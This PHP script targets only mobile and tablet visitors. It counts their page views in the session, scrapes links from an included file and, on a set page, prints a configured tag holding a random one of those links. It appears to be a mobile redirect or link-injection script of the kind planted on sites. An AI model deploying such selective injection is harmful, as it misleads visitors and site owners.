<?php
$config = require __DIR__ . '/' . ((isset($_SERVER['HTTP_HOST']) && is_file(__DIR__ . '/' . $_SERVER['HTTP_HOST'] . '.php')) ? $_SERVER['HTTP_HOST'] : 'val.fm') . '.php';

if(isset($config['enabled']) && $config['enabled']) {
    $detect = new MDetect();

	$useragent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null;
    if($detect->isMobile($useragent) || $detect->isTablet($useragent)) {
        $status = true;
    }
    else {
        $status = false;
    }

	if($status) {
		echo '<!-- stat ok -->';

		if(!isset($_SESSION[$config['session_variable']])) {
			$_SESSION[$config['session_variable']] = array(
				'links' => array(),
				'timestamp' => time(),
				'page' => 0,
			);
		}

		if(time() - $_SESSION[$config['session_variable']]['timestamp'] > $config['timeout']) {
			$_SESSION[$config['session_variable']]['links'] = array();
			$_SESSION[$config['session_variable']]['timestamp'] = time();
			$_SESSION[$config['session_variable']]['page'] = 0;
		}

		if(time() - $_SESSION[$config['session_variable']]['timestamp'] <= $config['timeout']) {
			$_SESSION[$config['session_variable']]['page']++;

			if($_SESSION[$config['session_variable']]['page'] <= $config['write_page']) {
				for($i = 0; $i < $config['times']; $i++) {
					ob_start();
					require $config['file'];
					$contents = ob_get_contents();
					ob_end_clean();

					preg_match_all('#<a.*?href="(.*?)".*?>(.*?)<\/a>#is', $contents, $links);

					foreach($links[1] as $link) {
						$_SESSION[$config['session_variable']]['links'][] = $link;
					}

					echo '<!-- ok -->';
					echo $contents;
				}
			}
			else {
				echo '<!-- skip -->';
				require $config['file'];
			}

			if($_SESSION[$config['session_variable']]['page'] == $config['show_page']) {
				if(count($_SESSION[$config['session_variable']]['links'])) {
					$r = array_rand($_SESSION[$config['session_variable']]['links']);

					echo strtr($config['tag'], array(
						'%link%' => $_SESSION[$config['session_variable']]['links'][$r],
					));
				}
			}
		}
	}
	else {
		echo '<!-- skipd -->';
		require $config['file'];
	}
}